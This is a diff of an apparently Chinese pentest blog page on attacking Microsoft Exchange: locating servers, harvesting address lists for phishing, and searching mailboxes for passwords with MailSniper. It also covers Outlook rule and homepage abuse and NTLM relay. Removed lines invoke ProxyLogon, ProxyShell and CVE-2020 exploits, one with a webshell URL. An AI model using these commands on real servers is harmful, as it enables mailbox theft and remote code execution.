@@ -137,6 +137,9 @@
 <a id="more"></a> 
 
 
+
+
+
 <h1 id="认识Exchange"><a href="#认识Exchange" class="headerlink" title="认识Exchange"></a>认识Exchange</h1><blockquote>
 <p>Exchange Server是微软的一套电子邮件服务组件，是一个消息与写作系统。通常被用来构架应用于企业、学校的邮件系统。Exchange还是一个协作平台，在此基础上可以开发工作流，知识管理系统，Web系统或者是其他消息系统</p>
 </blockquote>
@@ -221,7 +224,7 @@
 <h1 id="发现Exchange"><a href="#发现Exchange" class="headerlink" title="发现Exchange"></a>发现Exchange</h1><blockquote>
 <p>在渗透中如何找到Exchange服务器IP，如何定位Exchange服务器机器</p>
 </blockquote>
-<h2 id="定位Exchange"><a href="#定位Exchange" class="headerlink" title="定位Exchange"></a>定位Exchange</h2><h4 id="域外定位"><a href="#域外定位" class="headerlink" title="域外定位"></a>域外定位</h4><h5 id="空间搜索"><a href="#空间搜索" class="headerlink" title="空间搜索"></a>空间搜索</h5><blockquote>
+<h2 id="定位Exchange"><a href="#定位Exchange" class="headerlink" title="定位Exchange"></a>定位Exchange</h2><h3 id="域外定位"><a href="#域外定位" class="headerlink" title="域外定位"></a>域外定位</h3><h4 id="空间搜索"><a href="#空间搜索" class="headerlink" title="空间搜索"></a>空间搜索</h4><blockquote>
 <p>这里直接用FOFA来举例：</p>
 </blockquote>
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">microsoft exchange <span class="number">2019</span>：</span><br><span class="line">app=&quot;Microsoft-Exchange-Server-<span class="number">2019</span>-CU5&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2019</span>-CU3&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2019</span>-Preview&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2019</span>-CU8&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2019</span>-CU1&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2019</span>-CU7&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2019</span>-CU2&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2019</span>-CU6&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2019</span>-RTM&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2019</span>-CU4&quot;</span><br><span class="line"></span><br><span class="line">microsoft exchange <span class="number">2016</span>：</span><br><span class="line">app=&quot;Microsoft-Exchange-Server-<span class="number">2016</span>-CU19&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2016</span>-CU3&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2016</span>-CU12&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2016</span>-RTM&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2016</span>-CU7&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2016</span>-CU17&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2016</span>-CU2&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2016</span>-CU1&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2016</span>-CU14&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2016</span>-CU5&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2016</span>-CU11&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2016</span>-CU9&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2016</span>-CU16&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2016</span>-CU10&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2016</span>-CU6&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2016</span>-CU13&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2016</span>-CU18&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2016</span>-CU8&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2016</span>-CU4&quot;||app=&quot;Microsoft-Exchange-<span class="number">2016</span>-POP3-server&quot;</span><br><span class="line"></span><br><span class="line">microsoft exchange <span class="number">2013</span>：</span><br><span class="line">app=&quot;Microsoft-Exchange-<span class="number">2013</span>&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2013</span>-CU21&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2013</span>-CU17&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2013</span>-CU23&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2013</span>-CU13&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2013</span>-CU22&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2013</span>-CU11&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2013</span>-CU2&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2013</span>-CU16&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2013</span>-CU19&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2013</span>-CU3&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2013</span>-CU18&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2013</span>-CU5&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2013</span>-CU20&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2013</span>-CU12&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2013</span>-CU15&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2013</span>-CU10&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2013</span>-CU9&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2013</span>-CU6&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2013</span>-CU7&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2013</span>-CU1&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2013</span>-CU14&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2013</span>-CU8&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2013</span>-RTM&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2013</span>-SP1&quot;||app=&quot;Microsoft-Exchange-<span class="number">2013</span>&quot;</span><br><span class="line"></span><br><span class="line">microsoft exchange <span class="number">2010</span>：</span><br><span class="line">app=&quot;Microsoft-Exchange-<span class="number">2010</span>-POP3-server-version-<span class="number">03</span>.<span class="number">1</span>&quot;||app=&quot;Microsoft-Exchange-Server-<span class="number">2010</span>&quot;</span><br></pre></td></tr></table></figure>
@@ -372,50 +375,10 @@
 
 
 
-<h4 id="ProxyLogon"><a href="#ProxyLogon" class="headerlink" title="ProxyLogon"></a>ProxyLogon</h4><blockquote>
-<p><a target="_blank" rel="noopener" href="https://github.com/hausec/ProxyLogon">ProxyLogon</a></p>
-<p>SSRF+RCE（CVE-2021-26855、CVE-2021-27065）</p>
-<ul>
-<li><p>Exchange Server 2019 &lt; 15.02.0792.010</p>
-</li>
-<li><p>Exchange Server 2019 &lt; 15.02.0721.013</p>
-</li>
-<li><p>Exchange Server 2016 &lt; 15.01.2106.013</p>
-</li>
-<li><p>Exchange Server 2013 &lt; 15.00.1497.012</p>
-</li>
-</ul>
-</blockquote>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python proxylogon.py &lt;name <span class="keyword">or</span><span class="built_in"> IP </span>of server&gt; &lt;user@fqdn&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h4 id="ProxyShell"><a href="#ProxyShell" class="headerlink" title="ProxyShell"></a>ProxyShell</h4><blockquote>
-<p><a target="_blank" rel="noopener" href="https://github.com/ktecv2000/ProxyShell">ProxyShell</a></p>
-<p>CVE-2021-34473(Microsoft Exchange ACL绕过漏洞)、CVE-2021-34523(Microsoft Exchange权限提升漏洞)、CVE-2021-31207(Microsoft Exchange授权任意文件写入漏洞</p>
-<ul>
-<li><p>Exchange Server 2013 Versions &lt; Builder 15.0.1497.012</p>
-</li>
-<li><p>Exchange Server 2016 CU18 &lt; Builder 15.1.2106.013</p>
-</li>
-<li><p>Exchange Server 2016 CU19 &lt; Builder 15.1.2176.009</p>
-</li>
-<li><p>Exchange Server 2019 CU7 &lt; Builder 15.2.0721.013</p>
-</li>
-</ul>
-</blockquote>
-<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python3</span> exploit.<span class="keyword">py</span> <span class="symbol">&lt;target-exchange-server-ip&gt;</span> <span class="symbol">&lt;email&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h3 id="拥有凭证"><a href="#拥有凭证" class="headerlink" title="拥有凭证"></a>拥有凭证</h3><h4 id="导出邮箱"><a href="#导出邮箱" class="headerlink" title="导出邮箱"></a>导出邮箱</h4><blockquote>
+<h1 id="Exchange-后渗透"><a href="#Exchange-后渗透" class="headerlink" title="Exchange 后渗透"></a>Exchange 后渗透</h1><h2 id="普通凭证"><a href="#普通凭证" class="headerlink" title="普通凭证"></a>普通凭证</h2><h3 id="导出邮箱"><a href="#导出邮箱" class="headerlink" title="导出邮箱"></a>导出邮箱</h3><blockquote>
 <p>基本是利用Exchange的全局地址列表(GAL)，将所有邮箱地址进行获取，方便后续钓鱼和爆破高权限账号。</p>
 </blockquote>
-<h5 id="通过RPC"><a href="#通过RPC" class="headerlink" title="通过RPC"></a>通过RPC</h5><blockquote>
+<h4 id="通过RPC"><a href="#通过RPC" class="headerlink" title="通过RPC"></a>通过RPC</h4><blockquote>
 <p><a target="_blank" rel="noopener" href="https://github.com/fortra/impacket">exchanger.py</a></p>
 <p>通过<code> /RPC/</code> 接口配合 [MS-OXNSPI] 和 [MS-NSPI] 协议直接获取 AD 中的地址簿信息，最快。</p>
 </blockquote>
@@ -423,7 +386,7 @@
 
 
 
-<h5 id="通过EWS"><a href="#通过EWS" class="headerlink" title="通过EWS"></a>通过EWS</h5><blockquote>
+<h4 id="通过EWS"><a href="#通过EWS" class="headerlink" title="通过EWS"></a>通过EWS</h4><blockquote>
 <p><a target="_blank" rel="noopener" href="https://github.com/dafthack/MailSniper/blob/master/MailSniper.ps1">MailSniper(Get-GlobalAddressList)</a></p>
 <p>通过<code>/EWS/</code>指定搜索内容进行爆破，比较慢</p>
 </blockquote>
@@ -431,7 +394,7 @@
 
 
 
-<h5 id="通过MAPI"><a href="#通过MAPI" class="headerlink" title="通过MAPI"></a>通过MAPI</h5><blockquote>
+<h4 id="通过MAPI"><a href="#通过MAPI" class="headerlink" title="通过MAPI"></a>通过MAPI</h4><blockquote>
 <p><a target="_blank" rel="noopener" href="https://github.com/sensepost/ruler">ruler</a></p>
 <p>通过 <code>/mapi/ </code>模拟 Outlook 通信，通过 /Autodiscover 实现与 Outlook 类似的自动配置能力，ruler 会自动发现 Exchange 域内的域名并访问。但如果攻击者处于域外的话，会因为 DNS 无法解析导致攻击失败，需要攻击者手动配置域名解析。</p>
 </blockquote>
@@ -439,7 +402,7 @@
 
 
 
-<h5 id="通过OAB"><a href="#通过OAB" class="headerlink" title="通过OAB"></a>通过OAB</h5><blockquote>
+<h4 id="通过OAB"><a href="#通过OAB" class="headerlink" title="通过OAB"></a>通过OAB</h4><blockquote>
 <p>通过<code>/OAB/</code>(Offline Address Book)离线地址簿，地址结合列表的副本。</p>
 <p>需要构造Post包访问<code>/Autodiscover </code>读取Autodiscover的配置文件</p>
 <p>然后访问<code>&lt;OABUrl&gt;/oab.xml</code>列出OAB文件</p>
@@ -474,11 +437,11 @@
 
 
 
-<h5 id="通过OWA"><a href="#通过OWA" class="headerlink" title="通过OWA"></a>通过OWA</h5><blockquote>
+<h4 id="通过OWA"><a href="#通过OWA" class="headerlink" title="通过OWA"></a>通过OWA</h4><blockquote>
 <p>通过<code>/OWA/</code>。也就是Exchange OWA登陆以后，右上角:<code>人员</code>&gt;<code>所有人员</code>&gt;<code>抓包</code></p>
 <p>不建议不好用，人员太多还容易卡死</p>
 </blockquote>
-<h5 id="通过LDAP"><a href="#通过LDAP" class="headerlink" title="通过LDAP"></a>通过LDAP</h5><blockquote>
+<h4 id="通过LDAP"><a href="#通过LDAP" class="headerlink" title="通过LDAP"></a>通过LDAP</h4><blockquote>
 <p>需要能够访问到域控制器的LDAP服务(389端口)、需要域用户凭证</p>
 <p>通常来说Exchange用户同域用户存在对应关系，所以可以根据域用户信息获取Exchange邮箱用户的信息</p>
 <p>但是并不是每个域用户都有邮箱账户，有可能域用户没开通邮箱账户。</p>
@@ -490,10 +453,10 @@
 
 
 
-<h4 id="搜索邮件"><a href="#搜索邮件" class="headerlink" title="搜索邮件"></a>搜索邮件</h4><blockquote>
+<h3 id="搜索邮件"><a href="#搜索邮件" class="headerlink" title="搜索邮件"></a>搜索邮件</h3><blockquote>
 <p>邮件中含有敏感信息</p>
 </blockquote>
-<h5 id="MailSniper-ps1-3"><a href="#MailSniper-ps1-3" class="headerlink" title="MailSniper.ps1"></a>MailSniper.ps1</h5><blockquote>
+<h4 id="MailSniper-ps1-3"><a href="#MailSniper-ps1-3" class="headerlink" title="MailSniper.ps1"></a>MailSniper.ps1</h4><blockquote>
 <p><a target="_blank" rel="noopener" href="https://github.com/dafthack/MailSniper/blob/master/MailSniper.ps1">MailSniper.ps1</a></p>
 </blockquote>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 指定 lisi 的账密查询 lisi 的所有邮件，-remote 输入用户凭证</span></span><br><span class="line"><span class="attribute">Invoke</span>-SelfSearch -Folder <span class="literal">all</span> -Mailbox lisi@island.com -ExchHostname win<span class="number">2012</span>-ex<span class="number">2016</span>.island.com -MailsPerUser <span class="number">500</span> -Terms <span class="string">&quot;*password*&quot;</span>,<span class="string">&quot;*creds*&quot;</span>,<span class="string">&quot;*credentials*&quot;</span>,<span class="string">&quot;*测试*&quot;</span>,<span class="string">&quot;*密码*&quot;</span>,<span class="string">&quot;*拓扑*&quot;</span>,<span class="string">&quot;*运维*&quot;</span>,<span class="string">&quot;*VPN*&quot;</span>,<span class="string">&quot;*账号*&quot;</span> -OutputCsv lisi-email-search.csv -Remote -User island.com\lisi -Password LS@<span class="number">123</span>qwe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用当前会话的默认凭证搜索 zhangsan 的所有邮件</span></span><br><span class="line"><span class="comment"># 配合 mimikatz 实现 pth 后，不使用账号密码，使用凭证搜索</span></span><br><span class="line"><span class="attribute">Invoke</span>-SelfSearch -Folder <span class="literal">all</span> -Mailbox zhangsan@island.com -ExchHostname win<span class="number">2012</span>-ex<span class="number">2016</span>.island.com -MailsPerUser <span class="number">500</span> -Terms <span class="string">&quot;*password*&quot;</span>,<span class="string">&quot;*creds*&quot;</span>,<span class="string">&quot;*credentials*&quot;</span>,<span class="string">&quot;*测试*&quot;</span>,<span class="string">&quot;*密码*&quot;</span>,<span class="string">&quot;*拓扑*&quot;</span>,<span class="string">&quot;*运维*&quot;</span>,<span class="string">&quot;*VPN*&quot;</span>,<span class="string">&quot;*账号*&quot;</span> -OutputCsv zhangsan-email-search.csv</span><br></pre></td></tr></table></figure>
@@ -506,15 +469,14 @@
 
 
 
-
-<h5 id="ewManage"><a href="#ewManage" class="headerlink" title="ewManage"></a>ewManage</h5><blockquote>
+<h4 id="ewManage"><a href="#ewManage" class="headerlink" title="ewManage"></a>ewManage</h4><blockquote>
 <p>ewManage</p>
 </blockquote>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出邮件内容</span></span><br><span class="line">ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u username -p password -ewsPath https:<span class="regexp">//</span>ewshost<span class="regexp">/ews/</span>Exchange.asmx -Mode ListMail -Folder Inbox</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索存在关键字的邮件</span></span><br><span class="line">.<span class="regexp">/ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u username -p password -ewsPath https:/</span><span class="regexp">/ewhost/</span>ews/Exchange.asmx -Mode SearchMail -String vpn</span><br></pre></td></tr></table></figure>
 
 
 
-<h4 id="导出邮件"><a href="#导出邮件" class="headerlink" title="导出邮件"></a>导出邮件</h4><blockquote>
+<h3 id="导出邮件"><a href="#导出邮件" class="headerlink" title="导出邮件"></a>导出邮件</h3><blockquote>
 <p>可以通过账号密码进行查看和导出，也可以通过Hash在成功PTH后进行导出.</p>
 </blockquote>
 <blockquote>
@@ -526,16 +488,16 @@
 
 
 
-<h4 id="搜索共享"><a href="#搜索共享" class="headerlink" title="搜索共享"></a>搜索共享</h4><blockquote>
+<h3 id="搜索共享"><a href="#搜索共享" class="headerlink" title="搜索共享"></a>搜索共享</h3><blockquote>
 <p>老版本 Exchange 支持查看域内文件共享，且支持移动端通过 <code>/Microsoft-Server-ActiveSync</code> 远程访问网络内部的共享文件。在 Exchange 2010 及其后续版本中，删除了 Outlook 的文件共享权限，但通过 <code>/Microsoft-Server-ActiveSync</code> 接口依然可以。</p>
 </blockquote>
-<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># UNC 路径仅支持主机名，不支持 IP 和 FQDN</span><br><span class="line">python2 -m peas <span class="number">192.168</span><span class="number">.123</span><span class="number">.123</span></span><br><span class="line">python2 -m peas <span class="number">192.168</span><span class="number">.123</span><span class="number">.123</span> -u island.com\zhangsan -p ZS@<span class="number">123</span>qwe --check</span><br><span class="line">python2 -m peas <span class="number">192.168</span><span class="number">.123</span><span class="number">.123</span> -u island.com\zhangsan -p ZS@<span class="number">123</span>qwe --<span class="type">list</span>-unc=<span class="string">&quot;<span class="subst">\\</span>WIN2012-DC1&quot;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># UNC 路径仅支持主机名，不支持 IP 和 FQDN</span><br><span class="line">python2 -m peas <span class="number">192.168</span><span class="number">.123</span><span class="number">.123</span></span><br><span class="line">python2 -m peas <span class="number">192.168</span><span class="number">.123</span><span class="number">.123</span> -u island.com\ffffff0x -p f0x@<span class="number">123</span>qwe --check</span><br><span class="line">python2 -m peas <span class="number">192.168</span><span class="number">.123</span><span class="number">.123</span> -u island.com\ffffff0x -p f0x@<span class="number">123</span>qwe --<span class="type">list</span>-unc=<span class="string">&quot;<span class="subst">\\</span>WIN2012-DC1&quot;</span></span><br></pre></td></tr></table></figure>
 
 
 
 
 
-<h4 id="搜索域信息"><a href="#搜索域信息" class="headerlink" title="搜索域信息"></a>搜索域信息</h4><blockquote>
+<h3 id="搜索域信息"><a href="#搜索域信息" class="headerlink" title="搜索域信息"></a>搜索域信息</h3><blockquote>
 <p>/rpc 接口支持各种远程调用，其中包括 <code>[MS-OXNSPI]</code> 协议，该协议用于客户端从 Exchange 服务器获取 OAB 数据。Exchange 本身并不存储地址簿数据，而是通过 <code>[MS-NSPI]</code> 协议与域控通信，访问 Active Directory 来获取地址簿数据。</p>
 </blockquote>
 <ul>
@@ -547,7 +509,7 @@
 
 
 
-<h4 id="邮箱权限委派"><a href="#邮箱权限委派" class="headerlink" title="邮箱权限委派"></a>邮箱权限委派</h4><blockquote>
+<h3 id="邮箱权限委派"><a href="#邮箱权限委派" class="headerlink" title="邮箱权限委派"></a>邮箱权限委派</h3><blockquote>
 <p>邮箱用户可以通过Outlook设置自己邮箱各个文件夹的权限，通过权限设置可以委派给其他用户访问邮箱文件夹的权限，默认存在<code>默认规则</code>和<code>匿名规则</code>单都为<code>无</code>，但如果权限委派过于宽泛时会导致被间接获取邮箱访问权限。</p>
 <p>邮箱用户权限委派查看方式：<code>OWA登陆</code> &gt; <code>收件箱</code> &gt; <code>右键</code> &gt; <code>属性</code> &gt; <code>权限</code></p>
 </blockquote>
@@ -566,85 +528,7 @@
 
 
 
-
-
-<p>攻击Outlook客户端</p>
-<h4 id="配合SSRF进行中继"><a href="#配合SSRF进行中继" class="headerlink" title="配合SSRF进行中继"></a>配合SSRF进行中继</h4><h4 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h4><h5 id="CVE-2020-0688"><a href="#CVE-2020-0688" class="headerlink" title="CVE-2020-0688"></a>CVE-2020-0688</h5><blockquote>
-<p><a target="_blank" rel="noopener" href="https://github.com/zcgonvh/CVE-2020-0688">CVE-2020-0688</a></p>
-<p>漏洞是由于Exchange服务器在安装时没有正确地创建唯一的加密密钥所造成的。</p>
-<ul>
-<li><p>Microsoft Exchange Server 2010 Service Pack 3</p>
-</li>
-<li><p>Microsoft Exchange Server 2013</p>
-</li>
-<li><p>Microsoft Exchange Server 2016</p>
-</li>
-<li><p>Microsoft Exchange Server 2019</p>
-</li>
-</ul>
-</blockquote>
-<ul>
-<li>检测</li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExchangeDetect &lt;target&gt; &lt;user&gt; &lt;pass&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>利用</li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExchangeCmd &lt;target&gt; &lt;user&gt; &lt;pass&gt; exec whoami</span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="CVE-2020-17144"><a href="#CVE-2020-17144" class="headerlink" title="CVE-2020-17144"></a>CVE-2020-17144</h5><blockquote>
-<p><a target="_blank" rel="noopener" href="https://github.com/zcgonvh/CVE-2020-17144">CVE-2020-17144</a></p>
-<p>漏洞是由于Exchange服务器在安装时没有正确地创建唯一的加密密钥所造成的。</p>
-<ul>
-<li>Microsoft Exchange Server 2010 Service Pack 3 Update Rollup 31</li>
-<li>基本用不到了</li>
-</ul>
-</blockquote>
-<ul>
-<li>利用</li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CVE-<span class="number">2020</span>-<span class="number">17144</span> &lt;target&gt; &lt;user&gt; &lt;pass&gt;</span><br><span class="line"></span><br><span class="line"># 成功以后访问这个内存马，注意<span class="number">80</span>，<span class="number">443</span>的问题</span><br><span class="line"><span class="function">http://<span class="title">owa.domain.com</span>/<span class="title">ews</span>/<span class="title">soap</span>/?<span class="title">pass</span>=<span class="title">whoami</span> </span></span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="CVE-2021-27065"><a href="#CVE-2021-27065" class="headerlink" title="CVE-2021-27065"></a>CVE-2021-27065</h5><h5 id="ProxyLogon-1"><a href="#ProxyLogon-1" class="headerlink" title="ProxyLogon"></a>ProxyLogon</h5><blockquote>
-<p><a target="_blank" rel="noopener" href="https://github.com/hausec/ProxyLogon?tab=readme-ov-file">ProxyLogon</a>\<a target="_blank" rel="noopener" href="https://github.com/p0wershe11/ProxyLogon.git">ProxyLogon For Python3</a></p>
-<p>通过CVE-2021-26855的ssrf漏洞读取到邮箱用户的SID，通过有效SID结合CVE-2021-27065任意文件写入漏洞上传以.aspx结尾的文件，在其中插入一句话木马.</p>
-</blockquote>
-<blockquote>
-<p>Exchange Server 2019 &lt; 15.02.0792.010</p>
-<p>Exchange Server 2019 &lt; 15.02.0721.013</p>
-<p>Exchange Server 2016 &lt; 15.01.2106.013</p>
-<p>Exchange Server 2013 &lt; 15.00.1497.012</p>
-</blockquote>
-<ul>
-<li>目标 exchange 服务器必须为负载均衡服务器</li>
-<li>目标邮箱地址，需要为域内邮件地址而非邮箱地址(CVE-2021-26855)</li>
-<li>必须标识内部Exchange服务器的完全限定域名（FQDN）</li>
-</ul>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">proxylogon</span><span class="selector-class">.py</span> <span class="selector-tag">exchange</span><span class="selector-class">.com</span> <span class="selector-tag">admin</span><span class="keyword">@exchange</span>.com</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h5 id="proxyshell"><a href="#proxyshell" class="headerlink" title="proxyshell"></a>proxyshell</h5><blockquote>
-<p><a target="_blank" rel="noopener" href="https://github.com/ktecv2000/ProxyShell">proxyshell</a></p>
-<p>CVE-2021-34473、CVE-2021-31207、CVE-2021-34523组合利用实现rce</p>
-</blockquote>
-<blockquote>
-<p>Microsoft Exchange Server 2019 Cumulative Update 9<br>Microsoft Exchange Server 2019 Cumulative Update 8<br>Microsoft Exchange Server 2016 Cumulative Update 20<br>Microsoft Exchange Server 2016 Cumulative Update 19<br>Microsoft Exchange Server 2013 Cumulative Update 23</p>
-</blockquote>
-<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone <span class="symbol">https:</span>/<span class="regexp">/github.com/ktecv</span>2000/ProxyShell</span><br><span class="line">cd ProxyShell</span><br><span class="line">virtualenv -p $(which python3) venv</span><br><span class="line">source venv/bin/activate</span><br><span class="line">pip3 install pypsrp</span><br><span class="line">cp wsman.py venv/<span class="class"><span class="keyword">lib</span>/*/<span class="title">site</span>-<span class="title">packages</span>/<span class="title">pypsrp</span>/<span class="title">wsman</span>.<span class="title">py</span></span></span><br><span class="line"></span><br><span class="line">exploit.py exchange.com admin@exchange.com</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h4 id="滥用Outlook功能"><a href="#滥用Outlook功能" class="headerlink" title="滥用Outlook功能"></a>滥用Outlook功能</h4><blockquote>
+<h3 id="滥用Outlook功能"><a href="#滥用Outlook功能" class="headerlink" title="滥用Outlook功能"></a>滥用Outlook功能</h3><blockquote>
 <p>通过滥用Outlook客户端功能控制用户电脑.</p>
 <p>目前已知的有三种方式 <code>Rules</code>、<code>Forms</code>、<code>HomePage</code></p>
 <ul>
@@ -652,7 +536,7 @@
 <li>用户电脑安装了Outlook客户端，使用Outlook查看邮件时触发(一般是预装)</li>
 </ul>
 </blockquote>
-<h5 id="Froms"><a href="#Froms" class="headerlink" title="Froms"></a>Froms</h5><blockquote>
+<h4 id="Froms"><a href="#Froms" class="headerlink" title="Froms"></a>Froms</h4><blockquote>
 <p>Outlook 中大量对象本质上是 Froms。一封邮件，一个任务，一个公告，一个联系人实际上就是一个表单。</p>
 <p>用户可以自定义表单，<code>开发工具 -&gt; 设计窗体 -&gt; 标准窗体库 -&gt; 邮件 -&gt; 打开</code>，在其中可以改变表单样式。甚至可以更进一步，在 <code>窗体 -&gt; 查看代码</code> 处为”打开、转发、删除”等事件添加 VB 代码，攻击者可以借此来攻击 Outlook 客户端</p>
 <ul>
@@ -672,7 +556,7 @@
 
 
 
-<h5 id="Rules"><a href="#Rules" class="headerlink" title="Rules"></a>Rules</h5><blockquote>
+<h4 id="Rules"><a href="#Rules" class="headerlink" title="Rules"></a>Rules</h4><blockquote>
 <p>Outlook 提供了一项名为”规则和通知”的功能，其允许用户自行设置规则：当用户收发的邮件满足特定条件时，自动以某种方式处理该邮件。但处理邮件的动作可以是执行外部程序，导致攻击者可以用其来攻击 Outlook 客户端</p>
 <ul>
 <li>拥有一个邮箱用户账号</li>
@@ -713,7 +597,7 @@
 
 
 
-<h5 id="HomePage"><a href="#HomePage" class="headerlink" title="HomePage"></a>HomePage</h5><blockquote>
+<h4 id="HomePage"><a href="#HomePage" class="headerlink" title="HomePage"></a>HomePage</h4><blockquote>
 <p>Outlook 可以为每个文件夹设置主页，主页可以是内/外部的 http/https url，目的是让用户自由渲染文件夹样式。</p>
 <p>攻击者可以设置恶意主页，在 javascript 脚本中加载 <code>ViewCtl1.OutlookApplication</code> 逃离沙盒，进而调用 <code>Wscript.Shell</code> 创建命令执行。在受害者通过 Outlook 打开”收件箱”文件夹时会自动触发。</p>
 <ul>
@@ -745,12 +629,10 @@
 
 
 
-
-
-<h2 id="Exchange-后渗透"><a href="#Exchange-后渗透" class="headerlink" title="Exchange 后渗透"></a>Exchange 后渗透</h2><h3 id="NTLM-Relay"><a href="#NTLM-Relay" class="headerlink" title="NTLM Relay"></a>NTLM Relay</h3><blockquote>
+<h3 id="配合SSRF进行中继"><a href="#配合SSRF进行中继" class="headerlink" title="配合SSRF进行中继"></a>配合SSRF进行中继</h3><h3 id="用户组提权"><a href="#用户组提权" class="headerlink" title="用户组提权"></a>用户组提权</h3><h3 id="NTLM-Relay"><a href="#NTLM-Relay" class="headerlink" title="NTLM Relay"></a>NTLM Relay</h3><blockquote>
 <p>需要欺骗客户端向攻击者控制的服务器发起 NTLM 请求才能发起攻击，被欺骗的客户端可以是域用户账户，也可以是域机器账户。在 Exchange 其中一些服务(MAPI、RPC、EWS)默认支持NTML身份验证，攻击者可以通过邮件钓鱼中继域用户，也可以通过漏洞或欺骗强行中继 Exchange 服务器。</p>
 </blockquote>
